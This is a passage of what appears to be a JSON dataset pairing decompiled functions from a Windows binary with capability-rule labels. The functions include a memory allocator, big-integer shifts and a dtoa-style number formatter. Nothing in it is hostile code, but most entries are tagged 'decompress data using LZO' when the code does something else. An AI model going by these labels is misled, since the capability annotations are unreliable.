1;\n                } while (piVar2 != param_1 + -2);\n                return;\n            }\n            piVar3 = piVar4;\n        } while (piVar4 != param_1 + 5);\n    }\n    piVar3 = param_2 + 2;\n    do {\n        piVar4 = piVar3 + 1;\n        *piVar3 = 0;\n        piVar3 = piVar4;\n    } while (piVar4 != param_2 + 9);\n    return;\n}\n",
        "token_count": 493
    },
    "00440b50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00440b50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint16_t uVar7;\n    \n    uVar7 = *(param_1 + 4);\n    uVar5 = uVar7;\n    if (uVar7 == 0) {\n        uVar7 = *(param_1 + 6);\n        iVar1 = 0;\n        if (-1 < uVar7) {\n            while (uVar7 == 0) {\n                puVar2 = param_1 + 6;\n                while( true ) {\n                    puVar6 = puVar2 + 1;\n                    puVar2[-1] = uVar7;\n                    if (puVar6 == param_1 + 0x12) break;\n                    uVar7 = *puVar6;\n                    puVar2 = puVar6;\n                }\n                iVar1 = iVar1 + 0x10;\n                *(param_1 + 0x10) = 0;\n                if (iVar1 == 0x60) {\n                    return;\n                }\n                uVar7 = *(param_1 + 6);\n            }\n            if ((uVar7 & 0xff00) == 0) {\n                do {\n                    uVar7 = 0;\n                    puVar2 = param_1 + 0x10;\n                    do {\n                        uVar4 = *puVar2;\n                        puVar6 = puVar2 + -1;\n                        *puVar2 = uVar4 << 8 | uVar7;\n                        uVar7 = uVar4 >> 8;\n                        puVar2 = puVar6;\n                    } while (puVar6 != param_1 + 2);\n                    uVar7 = *(param_1 + 6);\n                    iVar1 = iVar1 + 8;\n                } while ((uVar7 & 0xff00) == 0);\n            }\n            while (-1 < uVar7) {\n                uVar7 = 0;\n                puVar2 = param_1 + 0x10;\n                do {\n                    if (*puVar2 < 0) {\n                        uVar7 = uVar7 | 1;\n                    }\n                    uVar4 = *puVar2 * 2;\n                    if ((uVar7 & 2) != 0) {\n                        uVar4 = uVar4 | 1;\n                    }\n                    puVar6 = puVar2 + -1;\n                    uVar7 = uVar7 * 2;\n                    *puVar2 = uVar4;\n                    puVar2 = puVar6;\n                } while (param_1 + 2 != puVar6);\n                iVar1 = iVar1 + 1;\n                if (0x60 < iVar1) {\n                    return;\n                }\n                uVar7 = *(param_1 + 6);\n            }\n        }\n    }\n    else {\n        iVar1 = 0;\n        if ((uVar7 & 0xff00) != 0) {\n            iVar1 = 0;\n            puVar2 = param_1 + 4;\n            while( true ) {\n                puVar6 = puVar2 + 1;\n                uVar7 = iVar1;\n                iVar1 = uVar5 << 8;\n                *puVar2 = uVar5 >> 8 | uVar7;\n                if (puVar6 == param_1 + 0x12) break;\n                uVar5 = *puVar6;\n                puVar2 = puVar6;\n            }\n            uVar5 = *(param_1 + 4);\n            iVar1 = -8;\n        }\n        while (uVar5 != 0) {\n            uVar3 = 0;\n            puVar2 = param_1 + 4;\n            while( true ) {\n                if ((uVar5 & 1) != 0) {\n                    uVar3 = uVar3 | 1;\n                }\n                uVar7 = uVar5 >> 1;\n                if ((uVar3 & 2) != 0) {\n                    uVar7 = uVar7 | 0x8000;\n                }\n                puVar6 = puVar2 + 1;\n                uVar3 = uVar3 * 2;\n                *puVar2 = uVar7;\n                if (param_1 + 0x12 == puVar6) break;\n                uVar5 = *puVar6;\n                puVar2 = puVar6;\n            }\n            iVar1 = iVar1 + -1;\n            if (iVar1 == -0x51) {\n                return;\n            }\n            uVar5 = *(param_1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 1048
    },
    "004436f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004436f0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    \n    piVar2 = param_1 + -1;\n    *param_1 = param_1[-1];\n    param_1[1] = 1 << (param_1[-1] & 0x1f);\n    if (piVar2 != NULL) {\n        if (9 < *param_1) {\n    // WARNING: Could not recover jumptable at 0x00446e88. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.00445e20();\n        bVar3 = *0x56bd88 == 2;\n        iVar1 = *(*param_1 * 4 + 0x56bd60);\n        *(*param_1 * 4 + 0x56bd60) = piVar2;\n        *piVar2 = iVar1;\n        if (bVar3) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56bda0);\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "00446000": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00446000(uint *param_1)\n\n{\n    uint uVar1;\n    bool bVar2;\n    \n    if (param_1 != NULL) {\n        if (9 < param_1[1]) {\n    // WARNING: Could not recover jumptable at 0x00446e88. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.00445e20();\n        bVar2 = *0x56bd88 == 2;\n        uVar1 = *(param_1[1] * 4 + 0x56bd60);\n        *(param_1[1] * 4 + 0x56bd60) = param_1;\n        *param_1 = uVar1;\n        if (bVar2) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56bda0);\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "00443920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * fcn.00443920(int32_t *param_1, int32_t param_2, uint32_t *param_3, uint32_t *param_4, uint32_t param_5, \n                   uint32_t param_6, int32_t *param_7, char **param_8)\n\n{\n    uint32_t *puVar1;\n    double dVar2;\n    double dVar3;\n    double dVar4;\n    bool bVar5;\n    double dVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    uint32_t *puVar11;\n    char *pcVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    uint32_t uVar21;\n    char *pcVar22;\n    uint32_t *puVar23;\n    uint32_t *puVar24;\n    int32_t iVar25;\n    uint32_t uVar26;\n    char *pcVar27;\n    char *pcVar28;\n    float10 fVar29;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint32_t uStack124;\n    uint32_t uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint32_t uStack108;\n    char *pcStack104;\n    uint uStack100;\n    int32_t iStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint32_t uStack76;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint32_t uStack60;\n    uint32_t uStack52;\n    uint32_t auStack32 [4];\n    \n    uVar14 = *param_4;\n    *param_4 = uVar14 & 0xffffffcf;\n    // switch table (5 cases) at 0x527880\n    switch(uVar14 & 7) {\n    case 0:\n        goto code_r0x00443a28;\n    case 1:\n    case 2:\n        iVar20 = 0;\n        iVar15 = *param_1;\n        if (0x20 < iVar15) {\n            iVar16 = 0x20;\n            do {\n                iVar25 = iVar16 * 2;\n                iVar20 = iVar20 + 1;\n                iVar18 = iVar16 * -2;\n                iVar16 = iVar25;\n            } while (iVar15 != iVar25 && SBORROW4(iVar15, iVar25) == iVar15 + iVar18 < 0);\n        }\n        iVar20 = fcn.00445f30(iVar20);\n        puVar1 = iVar20 + 0x14;\n        puVar11 = param_3;\n        puVar23 = puVar1;\n        do {\n            uVar13 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar24 = puVar23 + 1;\n            *puVar23 = uVar13;\n            puVar23 = puVar24;\n        } while (puVar11 <= param_3 + (iVar15 + -1 >> 5));\n        iVar16 = puVar24 - puVar1 >> 2;\ncode_r0x004439da:\n        iVar25 = iVar16 + -1;\n        if (puVar1[iVar25] == 0) break;\n        puVar1 = iVar20 + 0x10 + iVar16 * 4;\n        uVar13 = 0x1f;\n        if (*puVar1 != 0) {\n            for (; *puVar1 >> uVar13 == 0; uVar13 = uVar13 - 1) {\n            }\n        }\n        *(iVar20 + 0x10) = iVar16;\n        iVar25 = iVar16 * 0x20 - (uVar13 ^ 0x1f);\n        goto code_r0x004439f6;\n    case 3:\n        *param_7 = -0x8000;\n        pcVar12 = fcn.00443670(\"Infinity\", param_8, 8);\n        return pcVar12;\n    case 4:\n        *param_7 = -0x8000;\n        pcVar12 = fcn.00443670(0x527879, param_8, 3);\n        return pcVar12;\n    default:\n        return NULL;\n    }\n    iVar16 = iVar25;\n    if (iVar25 == 0) goto code_r0x00443e75;\n    goto code_r0x004439da;\ncode_r0x00444a34:\n    while( true ) {\n        iVar15 = fcn.004465a0(iStack132, uVar13);\n        pcVar27 = pcStack104 + 1;\n        if (iVar15 < 1) break;\n        *pcStack104 = uStack120;\n        uVar14 = fcn.00446070(uVar13, 10, 0);\n        if (uVar26 == uVar13) {\n            uVar26 = uVar14;\n        }\n        iVar20 = fcn.00446070(iVar20, 10, 0);\n        iVar15 = fcn.00443710(iVar20, iStack132);\n        uStack120 = iVar15 + 0x30;\n        uVar13 = uVar14;\n        pcStack104 = pcVar27;\n    }\n    if (uStack120 == 0x39) {\ncode_r0x00444cb9:\n        cVar10 = '9';\n        *pcStack104 = '9';\n        goto code_r0x004445fe;\n    }\n    uStack120 = uStack120 + 1;\n    uVar14 = 0x20;\ncode_r0x00444a6f:\n    *pcStack104 = uStack120;\ncode_r0x00444613:\n    fcn.00446000(iStack132);\n    iStack68 = uStack124 + 1;\n    if (uVar13 == 0) goto code_r0x00443fb7;\n    if ((uVar26 != 0) && (uVar26 != uVar13)) {\n        fcn.00446000(uVar26);\n    }\n    goto code_r0x00443faf;\ncode_r0x00443e75:\n    *(iVar20 + 0x10) = 0;\ncode_r0x004439f6:\n    auStack32[0] = fcn.004459c0(iVar20);\n    uStack120 = param_2;\n    if (auStack32[0] != 0) {\n        fcn.004458b0(iVar20, auStack32[0]);\n        uStack120 = param_2 + auStack32[0];\n        iVar25 = iVar25 - auStack32[0];\n    }\n    if (*(iVar20 + 0x10) == 0) {\n        fcn.00446000(iVar20);\ncode_r0x00443a28:\n        *param_7 = 1;\n        pcVar12 = fcn.00443670(0x52787d, param_8, 1);\n        return pcVar12;\n    }\n    fVar29 = fcn.004467d0(iVar20, auStack32);\n    dVar2 = fVar29;\n    uStack136 = dVar2 >> 0x20;\n    iVar18 = uStack120 + iVar25;\n    iVar19 = iVar18 + -1;\n    iVar16 = 1 - iVar18;\n    if (-1 < iVar19) {\n        iVar16 = iVar19;\n    }\n    dVar4 = iVar19 * *0x5278a8 + ((dVar2 & 0xfffffffffffff | 0x3ff0000000000000) - *0x527894) * *0x527898 + *0x5278a0;\n    if (0 < iVar16 + -0x435) {\n        dVar4 = (iVar16 + -0x435) * *0x5278b0 + dVar4;\n    }\n    uStack124 = ROUND(dVar4);\n    if ((dVar4 < 0.0) && (uStack124 != dVar4)) {\n        uStack124 = uStack124 - 1;\n    }\n    bVar7 = true;\n    uVar13 = iVar19 * 0x100000 + (uStack136 & 0xfffff | 0x3ff00000);\n    if (uStack124 < 0x17) {\n        if (*(uStack124 * 8 + 0x527920) <= (dVar2 & 0xffffffff | uVar13 << 0x20)) {\n            bVar7 = false;\n        }\n        else {\n            uStack124 = uStack124 - 1;\n            bVar7 = false;\n        }\n    }\n    uStack92 = 0;\n    pcStack104 = (iVar25 - iVar19) - 1;\n    if (pcStack104 < 0) {\n        pcStack104 = NULL;\n        uStack92 = 1 - (iVar25 - iVar19);\n    }\n    if (uStack124 < 0) {\n        uStack92 = uStack92 - uStack124;\n        uStack76 = 0;\n        iStack88 = -uStack124;\n    }\n    else {\n        pcStack104 = pcStack104 + uStack124;\n        uStack76 = uStack124;\n        iStack88 = 0;\n    }\n    if (9 < param_5) {\n        param_5 = 0;\n        goto code_r0x00443eb0;\n    }\n    if (param_5 < 6) {\n        bVar5 = iVar18 + 0x3fdU < 0x7f8;\n    }\n    else {\n        param_5 = param_5 - 4;\n        bVar5 = false;\n    }\n    if (param_5 == 3) {\n        bVar9 = false;\ncode_r0x00443c8b:\n        uStack60 = uStack124 + param_6;\n        uStack108 = uStack60 + 1;\n        bVar5 = uStack108 < 0xf & bVar5;\n        auStack32[0] = uStack108;\n        if (uStack108 < 1) {\n            auStack32[0] = 1;\n        }\ncode_r0x00443cbb:\n        pcVar12 = fcn.00443630(auStack32[0]);\n        uStack116 = param_1[3] - 1;\n        if (uStack116 != 0) goto code_r0x00443cda;\ncode_r0x00443cfb:\n        if ((!bVar5) || (uVar14 = uStack124 | uStack116,  uVar14 != 0)) goto code_r0x00443f20;\n        auStack32[0] = 0;\n        dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n        if ((bVar7) && (dVar4 < 1.0)) {\n            if (uStack108 == 0) {\n                dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n                dVar4 = dVar4 + dVar4 + *0x5278cc;\n                uStack100 = SUB84(dVar4, 0);\n                uStack116 = uStack100;\n                iStack96 = dVar4 >> 0x20;\n                iStack112 = iStack96 + -0x3400000;\n                goto code_r0x0044479c;\n            }\n            if (0 < uStack60) {\n                dVar4 = dVar4 * *0x5278c4;\n                dVar3 = dVar4 * *0x5278c8 + *0x5278cc;\n                iStack68 = SUB84(dVar3, 0);\n                uStack116 = iStack68;\n                iStack64 = dVar3 >> 0x20;\n                iStack68 = -1;\n                iStack112 = iStack64 + -0x3400000;\n                uVar26 = uStack60;\n                goto code_r0x00443d7d;\n            }\ncode_r0x00443e68:\n            uStack116 = 0;\n            goto code_r0x00443f20;\n        }\n        dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n        dVar4 = dVar4 + dVar4 + *0x5278cc;\n        iStack68 = SUB84(dVar4, 0);\n        uStack116 = iStack68;\n        iStack64 = dVar4 >> 0x20;\n        iStack112 = iStack64 + -0x3400000;\n        if (uStack108 == 0) {\ncode_r0x0044479c:\n            dVar4 = (dVar2 & 0xffffffff | uVar13 << 0x20) - *0x5278d0;\n            if (dVar4 <= CONCAT44(iStack112, uStack116)) {\n                if (-CONCAT44(iStack112, uStack116) <= dVar4) goto code_r0x00443e68;\n                goto code_r0x004447c6;\n            }\n            iStack68 = 2;\n            iStack132 = 0;\n            uVar13 = 0;\n            goto code_r0x00443f8d;\n        }\n        dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n        iStack68 = 0;\n        uVar26 = uStack108;\ncode_r0x00443d7d:\n        dVar3 = *(uVar26 * 8 + 0x527918);\n        pcVar28 = pcVar12;\n        if (!bVar9) {\n            dVar3 = dVar3 * CONCAT44(iStack112, uStack116);\n            auStack32[0] = 1;\n            pcVar22 = pcVar12;\n            dVar6 = dVar4;\n            bVar8 = false;\n            while( true ) {\n                iVar16 = ROUND(dVar6);\n                if (iVar16 != 0) {\n                    dVar6 = dVar6 - iVar16;\n                    bVar8 = bVar5;\n                }\n                pcVar27 = pcVar22 + 1;\n                uVar17 = iVar16 + 0x30;\n                *pcVar22 = uVar17;\n                if (auStack32[0] == uVar26) break;\n                dVar6 = dVar6 * *0x5278c4;\n                auStack32[0] = auStack32[0] + 1;\n                pcVar22 = pcVar27;\n                bVar8 = bVar5;\n            }\n            if (!bVar8) {\n                dVar6 = dVar4;\n            }\n            if (dVar3 + *0x5278d4 < dVar6) {\ncode_r0x00444b51:\n                iStack68 = iStack68 + 1;\n                goto code_r0x0044487e;\n            }\n            if (*0x5278d4 - dVar3 <= dVar6) goto code_r0x00443e68;\n            if (dVar6 == 0.0) {\n                uVar14 = 0;\n                iStack68 = iStack68 + 1;\n                pcVar28 = pcVar27;\n            }\n            else {\n                uVar14 = 0x10;\n                iStack68 = iStack68 + 1;\n                pcVar28 = pcVar27;\n            }\ncode_r0x00444993:\n            do {\n                pcVar27 = pcVar28;\n                pcVar28 = pcVar27 + -1;\n            } while (pcVar27[-1] == '0');\n            goto code_r0x00443fb7;\n        }\n        auStack32[0] = 0;\n        pcVar27 = pcVar12 + 1;\n        dVar6 = *0x5278d4;\n        uVar17 = ROUND(dVar4) + 0x30;\n        *pcVar12 = uVar17;\n        dVar3 = dVar6 / dVar3 - CONCAT44(iStack112, uStack116);\n        dVar4 = dVar4 - ROUND(dVar4);\n        if (dVar4 < dVar3) {\ncode_r0x00444ce1:\n            iStack68 = iStack68 + 1;\n            if (dVar4 != 0.0) {\n                uVar14 = 0x10;\n            }\n            goto code_r0x00443fb7;\n        }\n        pcVar22 = pcVar27;\n        if (dVar3 <= *0x5278c0 - dVar4) {\n            do {\n                auStack32[0] = auStack32[0] + 1;\n                if (uVar26 <= auStack32[0]) goto code_r0x00443e68;\n                pcVar27 = pcVar22 + 1;\n                dVar3 = dVar3 * *0x5278c4;\n                dVar4 = *0x5278c4 * dVar4;\n                uVar21 = ROUND(dVar4);\n                uVar17 = (uVar21 & 0xff) + 0x30;\n                dVar4 = dVar4 - uVar21;\n                *pcVar22 = uVar17;\n                if (dVar4 < dVar3) goto code_r0x00444ce1;\n                pcVar22 = pcVar27;\n            } while (dVar3 <= *0x5278c0 - dVar4);\n            goto code_r0x00444b51;\n        }\n        iStack68 = iStack68 + 1;\ncode_r0x0044487e:\n        while( true ) {\n            cVar10 = uVar17;\n            pcVar22 = pcVar27 + -1;\n            if (cVar10 != '9') break;\n            if (pcVar22 == pcVar12) {\n                iStack68 = iStack68 + 1;\n                *pcVar28 = '0';\n                cVar10 = pcVar27[-1];\n                pcVar22 = pcVar28;\n                break;\n            }\n            uVar17 = pcVar27[-2];\n            pcVar27 = pcVar22;\n        }\n        uVar14 = 0x20;\n        *pcVar22 = cVar10 + '\\x01';\n        pcVar12 = pcVar28;\n        goto code_r0x00443fb7;\n    }\n    if (param_5 < 4) {\n        bVar9 = false;\n        if (param_5 == 2) goto code_r0x00444266;\n    }\n    else {\n        bVar9 = true;\n        if (param_5 == 4) {\ncode_r0x00444266:\n            uStack108 = 1;\n            if (0 < param_6) {\n                uStack108 = param_6;\n            }\n            bVar5 = uStack108 < 0xf & bVar5;\n            param_6 = uStack108;\n            uStack60 = uStack108;\n            auStack32[0] = uStack108;\n            goto code_r0x00443cbb;\n        }\n        if (param_5 == 5) goto code_r0x00443c8b;\n    }\ncode_r0x00443eb0:\n    auStack32[0] = ROUND(iVar15 * *0x5278b8) + 3;\n    pcVar12 = fcn.00443630(auStack32[0]);\n    uStack116 = param_1[3] - 1;\n    if (uStack116 != 0) {\n        bVar5 = false;\n        bVar9 = true;\n        uStack60 = 0xffffffff;\n        uStack108 = 0xffffffff;\n        param_6 = 0;\ncode_r0x00443cda:\n        uVar26 = 2;\n        if (-1 < uStack116) {\n            uVar26 = uStack116;\n        }\n        uStack116 = 3 - uVar26;\n        if ((uVar14 & 8) == 0) {\n            uStack116 = uVar26;\n        }\n        goto code_r0x00443cfb;\n    }\n    param_6 = 0;\n    bVar9 = true;\n    uStack60 = 0xffffffff;\n    uStack108 = 0xffffffff;\ncode_r0x00443f20:\n    if ((uStack120 < 0) || (param_1[5] < uStack124)) {\n        iVar16 = iStack88;\n        uVar14 = uStack92;\n        if (bVar9) {\n            auStack32[0] = (iVar15 - iVar25) + 1;\n            if ((uStack120 - (iVar15 - iVar25) < param_1[1]) && ((param_5 - 3 & 0xfffffffd) != 0)) {\n                auStack32[0] = (uStack120 - param_1[1]) + 1;\n                if ((param_5 < 2 || uStack108 < 1) || (auStack32[0] <= uStack108)) goto code_r0x004440b8;\ncode_r0x0044449e:\n                iVar15 = uStack108 - 1;\n                iVar16 = iStack88 - iVar15;\n                if (iStack88 < iVar15) {\n                    iVar16 = 0;\n                    uStack76 = uStack76 + (iVar15 - iStack88);\n                    iStack88 = iVar15;\n                }\n                auStack32[0] = uStack108;\n                if (uStack108 < 0) {\n                    auStack32[0] = 0;\n                    uVar14 = uStack92 - uStack108;\n                }\n                else {\n                    pcStack104 = pcStack104 + uStack108;\n                    uStack92 = uStack108 + uStack92;\n                }\n            }\n            else {\n                if (1 < param_5) goto code_r0x0044449e;\ncode_r0x004440b8:\n                pcStack104 = pcStack104 + auStack32[0];\n                uStack92 = auStack32[0] + uStack92;\n            }\n            uVar13 = fcn.00446160(1);\n        }\n        else {\n            uVar13 = 0;\n        }\n        uVar26 = uStack76;\n        if ((0 < uVar14) && (0 < pcStack104)) {\n            auStack32[0] = pcStack104;\n            if (uVar14 <= pcStack104) {\n                auStack32[0] = uVar14;\n            }\n            uStack92 = uStack92 - auStack32[0];\n            pcStack104 = pcStack104 - auStack32[0];\n            uVar14 = uVar14 - auStack32[0];\n        }\n        iVar15 = iVar20;\n        if (iStack88 != 0) {\n            if (bVar9) {\n                if (iVar16 != 0) {\n                    uVar13 = fcn.00446300(uVar13, iVar16);\n                    iVar15 = fcn.00446190(uVar13, iVar20);\n                    fcn.00446000(iVar20);\n                    if (iStack88 - iVar16 == 0) goto code_r0x00444133;\n                }\n                iVar15 = fcn.00446300(iVar15, iStack88 - iVar16);\n            }\n            else {\n                iVar15 = fcn.00446300(iVar20, iStack88);\n            }\n        }\ncode_r0x00444133:\n        iStack132 = fcn.00446160(1);\n        if (uStack76 == 0) {\n            if ((iVar25 == 1 && param_5 < 2) && (param_1[1] + 1 < param_2)) {\ncode_r0x00444b22:\n                uStack92 = uStack92 + 1;\n                pcStack104 = pcStack104 + 1;\n                uStack76 = 1;\n                if (uVar26 != 0) goto code_r0x004442d3;\n            }\n            uVar26 = 0x1f;\n        }\n        else {\n            iStack132 = fcn.00446300(iStack132, uStack76);\n            if ((iVar25 == 1 && param_5 < 2) && (param_1[1] + 1 < param_2)) goto code_r0x00444b22;\n            uStack76 = 0;\ncode_r0x004442d3:\n            puVar1 = iStack132 + 0x10 + *(iStack132 + 0x10) * 4;\n            uVar26 = 0x1f;\n            if (*puVar1 != 0) {\n                for (; *puVar1 >> uVar26 == 0; uVar26 = uVar26 - 1) {\n                }\n            }\n            uVar26 = uVar26 ^ 0x1f;\n        }\n        uVar26 = (uVar26 - pcStack104) - 4 & 0x1f;\n        iVar20 = iVar15;\n        auStack32[0] = uVar26;\n        if (0 < uStack92 + uVar26) {\n            iVar20 = fcn.00446480(iVar15, uStack92 + uVar26);\n        }\n        if (0 < auStack32[0] + pcStack104) {\n            iStack132 = fcn.00446480(iStack132, auStack32[0] + pcStack104);\n        }\n        bVar5 = param_5 < 3;\n        if ((bVar7) && (iVar15 = fcn.004465a0(iVar20, iStack132),  iVar15 < 0)) {\n            uStack124 = uStack124 - 1;\n            iVar20 = fcn.00446070(iVar20, 10, 0);\n            uStack108 = uStack60;\n            if (bVar9) {\n                uVar13 = fcn.00446070(uVar13, 10, 0);\n                if (bVar5 || 0 < uStack60) {\ncode_r0x004442fc:\n                    uVar26 = uVar13;\n                    if (0 < uVar26 + uVar14) {\n                        uVar26 = fcn.00446480(uVar13, uVar26 + uVar14);\n                    }\n                    uVar13 = uVar26;\n                    if (uStack76 != 0) {\n                        iVar15 = fcn.00445f30(*(uVar26 + 4));\n                        sub.msvcrt.dll_memcpy(iVar15 + 0xc, uVar26 + 0xc, *(uVar26 + 0x10) * 4 + 8);\n                        uVar13 = fcn.00446480(iVar15, 1);\n                    }\n                    auStack32[0] = 1;\n                    pcStack104 = pcVar12;\n                    do {\n                        iVar15 = fcn.00443710(iVar20, iStack132);\n                        uStack120 = iVar15 + 0x30;\n                        uVar17 = fcn.004465a0(iVar20, uVar26);\n                        iVar16 = fcn.004465f0(iStack132, uVar13);\n                        uVar14 = 1;\n                        if (*(iVar16 + 0xc) == 0) {\n                            uVar14 = fcn.004465a0(iVar20, iVar16);\n                        }\n                        fcn.00446000(iVar16);\n                        if (((uVar14 | param_5) == 0) && (uVar21 = *param_3 & 1 | uStack116,  uVar21 == 0)) {\n                            pcVar27 = pcStack104 + 1;\n                            if (uStack120 == 0x39) goto code_r0x00444cb9;\n                            if (uVar17 < 1) {\n                                if (*(iVar20 + 0x10) < 2) {\n                                    uVar14 = 0x10;\n                                    if (*(iVar20 + 0x14) == 0) {\n                                        uVar14 = uVar21;\n                                    }\n                                }\n                                else {\n                                    uVar14 = 0x10;\n                                }\n                            }\n                            else {\n                                uStack120 = iVar15 + 0x31;\n                                uVar14 = 0x20;\n                            }\n                            goto code_r0x00444a6f;\n                        }\n                        if ((uVar17 < 0) || (((uVar17 | param_5) == 0 && ((*param_3 & 1) == 0)))) {\n                            if (uStack116 == 0) {\n                                if (0 < uVar14) goto code_r0x00444d24;\n                            }\n                            else {\n                                if ((1 < *(iVar20 + 0x10)) || (*(iVar20 + 0x14) != 0)) {\n                                    if (uStack116 != 2) goto code_r0x00444a34;\n                                    pcVar27 = pcStack104 + 1;\n                                    uVar14 = 0x10;\n                                    goto code_r0x00444a6f;\n                                }\n                                if (uVar14 < 1) {\n                                    pcVar27 = pcStack104 + 1;\n                                    uVar14 = 0;\n                                    goto code_r0x00444a6f;\n                                }\ncode_r0x00444d24:\n                                iVar20 = fcn.00446480(iVar20, 1);\n                                iVar16 = fcn.004465a0(iVar20, iStack132);\n                                if ((iVar16 < 1) && ((iVar16 != 0 || ((uStack120 & 1) == 0)))) {\n                                    uStack116 = 0x20;\n                                }\n                                else {\n                                    if (uStack120 == 0x39) {\n                                        pcVar27 = pcStack104 + 1;\n                                        goto code_r0x00444cb9;\n                                    }\n                                    uStack116 = 0x20;\n                                    uStack120 = iVar15 + 0x31;\n                                }\n                            }\n                            pcVar27 = pcStack104 + 1;\n                            uVar14 = 0x10;\n                            if ((*(iVar20 + 0x10) < 2) && (uVar14 = uStack116,  *(iVar20 + 0x14) != 0)) {\n                                uVar14 = 0x10;\n                            }\n                            goto code_r0x00444a6f;\n                        }\n                        pcVar27 = pcStack104 + 1;\n                        if ((0 < uVar14) && (uStack116 != 2)) {\n                            if (uStack120 == 0x39) goto code_r0x00444cb9;\n                            uVar14 = 0x20;\n                            *pcStack104 = uStack120 + '\\x01';\n                            goto code_r0x00444613;\n                        }\n                        *pcStack104 = uStack120;\n                        if (auStack32[0] == uStack108) goto code_r0x004445c4;\n                        iVar20 = fcn.00446070(iVar20, 10, 0);\n                        if (uVar26 == uVar13) {\n                            uVar13 = fcn.00446070(uVar26, 10, 0);\n                            uVar26 = uVar13;\n                        }\n                        else {\n                            uVar26 = fcn.00446070(uVar26, 10, 0);\n                            uVar13 = fcn.00446070(uVar13, 10, 0);\n                        }\n                        auStack32[0] = auStack32[0] + 1;\n                        pcStack104 = pcVar27;\n                    } while( true );\n                }\n            }\n            else if (bVar5 || 0 < uStack60) goto code_r0x00444560;\n        }\n        else if ((0 < uStack108) || (bVar5)) {\n            if (bVar9) goto code_r0x004442fc;\ncode_r0x00444560:\n            auStack32[0] = 1;\n            pcVar28 = pcVar12;\n            while( true ) {\n                pcVar27 = pcVar28 + 1;\n                iVar15 = fcn.00443710(iVar20, iStack132);\n                uStack120 = iVar15 + 0x30;\n                *pcVar28 = uStack120;\n                if (uStack108 <= auStack32[0]) break;\n                iVar20 = fcn.00446070(iVar20, 10, 0);\n                auStack32[0] = auStack32[0] + 1;\n                pcVar28 = pcVar27;\n            }\n            uVar26 = 0;\ncode_r0x004445c4:\n            if (uStack116 == 0) {\n                iVar20 = fcn.00446480(iVar20, 1);\n                iVar15 = fcn.004465a0(iVar20, iStack132);\n                cVar10 = pcVar27[-1];\n                if ((0 < iVar15) || ((iVar15 == 0 && ((uStack120 & 1) != 0)))) {\ncode_r0x004445fe:\n                    while (pcVar28 = pcVar27 + -1,  cVar10 == '9') {\n                        if (pcVar28 == pcVar12) {\n                            uStack124 = uStack124 + 1;\n                            uVar14 = 0x20;\n                            *pcVar12 = '1';\n                            goto code_r0x00444613;\n                        }\n                        cVar10 = pcVar27[-2];\n                        pcVar27 = pcVar28;\n                    }\n                    uVar14 = 0x20;\n                    *pcVar28 = cVar10 + '\\x01';\n                    goto code_r0x00444613;\n                }\n                iVar15 = *(iVar20 + 0x10);\ncode_r0x00444aca:\n                uVar14 = 0x10;\n                if (iVar15 < 2) {\n                    uVar14 = ~-(*(iVar20 + 0x14) == 0) & 0x10;\n                }\n            }\n            else {\n                iVar15 = *(iVar20 + 0x10);\n                cVar10 = pcVar27[-1];\n                if (uStack116 == 2) goto code_r0x00444aca;\n                if ((1 < iVar15) || (*(iVar20 + 0x14) != 0)) goto code_r0x004445fe;\n                uVar14 = 0;\n            }\n            while (cVar10 == '0') {\n                cVar10 = pcVar27[-2];\n                pcVar27 = pcVar27 + -1;\n            }\n            goto code_r0x00444613;\n        }\n        pcVar27 = pcVar12;\n        if (uStack108 == 0) {\n            iStack132 = fcn.00446070(iStack132, 5, 0);\n            iVar15 = fcn.004465a0(iVar20, iStack132);\n            if (0 < iVar15) {\n                iStack68 = uStack124 + 2;\n                goto code_r0x00443f8d;\n            }\n        }\ncode_r0x004441f0:\n        uVar14 = 0x10;\n        iStack68 = -param_6;\n        pcVar12 = pcVar27;\n    }\n    else {\n        dVar4 = *(uStack124 * 8 + 0x527920);\n        if ((-1 < param_6) || (0 < uStack108)) {\n            dVar2 = dVar2 & 0xffffffff | uVar13 << 0x20;\n            auStack32[0] = 1;\n            iStack68 = uStack124 + 1;\n            pcVar27 = pcVar12 + 1;\n            uStack52 = ROUND(dVar2 / dVar4);\n            *pcVar12 = uStack52 + '0';\n            dVar2 = dVar2 - uStack52 * dVar4;\n            if (dVar2 == 0.0) {\ncode_r0x00444728:\n                uVar14 = 0;\n                goto code_r0x00443fb7;\n            }\n            uVar14 = 1;\n            pcVar28 = pcVar27;\n            if 